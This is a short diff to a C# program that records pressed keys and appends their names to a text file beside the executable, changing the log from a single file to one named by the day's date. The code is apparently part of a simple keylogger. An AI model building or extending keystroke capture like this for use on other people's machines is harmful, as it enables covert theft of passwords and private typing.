@@ -34,9 +34,10 @@ namespace Program
                     {
                         //Console.WriteLine((Keys)i);
                         string toStringKeys = Convert.ToString((Keys)i);
+                        string filename = Application.StartupPath + "\\" + DateTime.Now.ToString("ddMMyyyy") + ".txt";
                         try
                         {
-                            File.AppendAllText(Application.StartupPath + "\\Logs.txt", Environment.NewLine + toStringKeys);
+                            File.AppendAllText(filename, Environment.NewLine + toStringKeys);
                         }
                         catch
                         {
